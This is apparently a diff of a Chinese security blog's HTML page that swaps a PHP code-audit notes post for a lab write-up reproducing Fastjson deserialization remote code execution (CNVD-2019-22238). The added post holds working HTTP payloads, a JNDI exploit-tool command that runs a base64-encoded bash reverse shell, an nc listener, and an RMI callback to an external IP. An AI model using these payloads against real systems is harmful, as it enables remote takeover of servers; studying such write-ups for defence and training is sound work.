@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    php代码审计_mvc框架审计_文件上传笔记 |  YaoWen&#39;s Blog
+    Fastjson远程代码执行CNVD-2019-22238 |  YaoWen&#39;s Blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-代码审计-php_mvc框架_文件上传"
+  id="post-Fastjson远程代码执行CNVD-2019-22238"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -55,22 +55,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  php代码审计_mvc框架审计_文件上传笔记
+  Fastjson远程代码执行CNVD-2019-22238
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
-  <time datetime="2023-01-04T18:43:32.868Z" itemprop="datePublished">2023-01-05</time>
+      <a href="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" class="article-date">
+  <time datetime="2023-01-06T16:18:11.955Z" itemprop="datePublished">2023-01-07</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">734</span>
+            <span class="post-count">933</span>
         </span>
     </span>
 
@@ -79,7 +79,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">4 分钟</span>
         </span>
     </span>
 </div>
@@ -94,30 +94,29 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2023年啦！最近在学代码审计。如果按照搭建博客的2021年1月算，我已经学了2年的网安啦！但是，我现在才感觉真正入门，如今的我，poc&amp;exp也会写了（能自己独立写，也能写到pocsuite3框架里面去），开始有分析漏洞的能力了（以前只会利用漏洞，不懂为什么payload要那样去打），现在能从代码层面一步一步追踪分析漏洞的成因，我有种打开新世界大门的感觉，我更加有信心了。虽然还有好多收获想说，但是又欲言又止，总之，还有很多东西等着我去探索学习。</p>
-<p>最近这几天写的一些poc列举</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20230104_7_thinkphp_lang_rce.py thinkphp lang远程命令执行</span><br><span class="line">20230103_6_sendproduct100_sqli.py 发货100 M_id SQL注入CNVD-2021-30193</span><br><span class="line">f5_big-ip_rce_cve-2021-22986.py BIG-IP远程代码执行漏洞(CVE-2021-22986)</span><br></pre></td></tr></table></figure>
-<h4 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h4><p>1月7日打算参加长亭科技举办的real world CTF体验赛，由于以前没有经验，所以我打算step by step，当作一次不错的学习机会来对待这个比赛。</p>
-<p>新的一年，我打算把php&amp;java代码审计(漏洞分析能力 漏洞挖掘能力)和内网渗透(复杂网络下的横向渗透能力)学好，有机会还可以学习一下云服务器下的渗透思路（assesskey泄露，CF框架的使用），至少达到中级红队的要求，准备23年6-7月份的护网以及秋招。</p>
-<p>其实除了传统的web安全，我对近源渗透（badUSB，wifi，门禁卡ID&amp;IC卡）以及apt攻击中常用的水坑攻击和鱼叉攻击都非常感兴趣，也都有所了解。</p>
-<h3 id="文件上传审计关键点"><a href="#文件上传审计关键点" class="headerlink" title="文件上传审计关键点"></a>文件上传审计关键点</h3><ul>
-<li>全局寻找关键字 $FILES 以及可能出现在代码中的文字(如，’文件上传成功’)，定位上传功能的代码段</li>
-<li>功能点抓包,再根据参数或路由信息找到对应源代码</li>
-<li>理清上传的判断逻辑（黑名单，白名单，前端js，MIME类型）</li>
-</ul>
-<h3 id="thinkphp框架下审计的关键点"><a href="#thinkphp框架下审计的关键点" class="headerlink" title="thinkphp框架下审计的关键点"></a>thinkphp框架下审计的关键点</h3><ul>
-<li><p>找到入口文件，思考网站的路由信息是如何生成的，网站目录结构</p>
-</li>
-<li><p>找到控制器文件，一般在application目录下，再结合一些功能点抓包得到的参数，理清代码结构逻辑，如在发送的poc中哪个参数对应类，哪个参数对应方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .&#x2F; -name &quot;*.php&quot;|xargs grep &quot;你要搜索的文件中的文本内容&quot; 一条有用查找文件内容的命令</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ul>
-<ul>
-<li>看使用框架的代码是否规范，是否正确的使用了框架的一些安全检查方法，而不是使用自己写方法。</li>
-</ul>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>理不清楚执行过程，可以通过phpstorm+xdebug设置断点一步一步看执行的情况。</p>
+  <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>以前都没怎么写技术有关的文章，可能是觉得自己写的会不好，误导别人。现在，自认为有点实力了，就写些漏洞复现的文章压压筋，另外一个原因就是，在复现找文章总是会出现各种问题，所以，我觉得还是自己写文章，做记录，这样以后又遇到类似的问题就可以看自己写的文章解决了。</p>
+<h3 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h3><p> Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象 Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。 </p>
+<h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>用的是vulfoucs靶场复现的，fastjson&lt;=1.2.24，由于fastjson版本不同payload也会有所不同，所以这里提前声明一下。</p>
+<p><img src="/image-20230106232719456.png" alt="image-20230106232719456"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要步骤 </span><br><span class="line">1.通过dnslog检测漏洞是否存在</span><br><span class="line">2.在公网vps上通过JNDI-Injection-Exploit工具搭建ladp和rmi服务</span><br><span class="line">3.反弹shell</span><br></pre></td></tr></table></figure>
+<p>工具下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit.git</span><br></pre></td></tr></table></figure>
+<p>1.通过dns记录简单检测是否存在漏洞，我这里用的是<code>dnslog.cn</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:30205</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;13uw56.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>注意: 双引号和逗号都是英文的，复制之后注意检查，还有注意<code>Content-Type: application/json</code>,提交方式为<code>POST</code></p>
+<p>返回包没有报错就是一般就是利用成功了</p>
+<p><img src="/image-20230106231837457.png" alt="image-20230106231837457"></p>
+<p><img src="/image-20230106230659916.png" alt="image-20230106230659916"></p>
+<p>2.在vps上通过JNDI-Injection-Exploit工具搭建ldap&amp;rmi服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64加密的bash反弹shell payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;vps的ip地址&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/image-20230106231218516.png" alt="image-20230106231218516"></p>
+<p>这里的bash 反弹shell可以去<code>https://www.revshells.com/</code>这个网站生成，然后进行base64编码即可。</p>
+<p>3.将rmi生成的利用链进行加载请求，失败就尝试其他的链，不同版本payload有所不同，这里是<code>fastjson&lt;=1.2.24</code></p>
+<p>vps上同时监听对应的端口```nc -lvvp [port]``</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:32132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;123.249.90.73:1099&#x2F;fanobj&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功反弹shell获取到flag</p>
+<p><img src="/image-20230107000209003.png" alt="image-20230107000209003"></p>
+<p>打完，收工，早上10点打ctf比赛，嘿嘿！</p>
  
       <!-- reward -->
       
@@ -189,7 +188,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -200,19 +199,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            Fastjson远程代码执行CNVD-2019-22238
-          
-        </div>
-      </a>
     
-    
-      <a href="/2022/04/28/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-php%E4%B8%8B%E9%80%9A%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E5%BE%A1sql%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+      <a href="/2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">学习&amp;生活_php下通过预编译防御sql注入</div>
+        <div class="article-nav-title">php代码审计_mvc框架审计_文件上传笔记</div>
       </a>
     
   </nav>
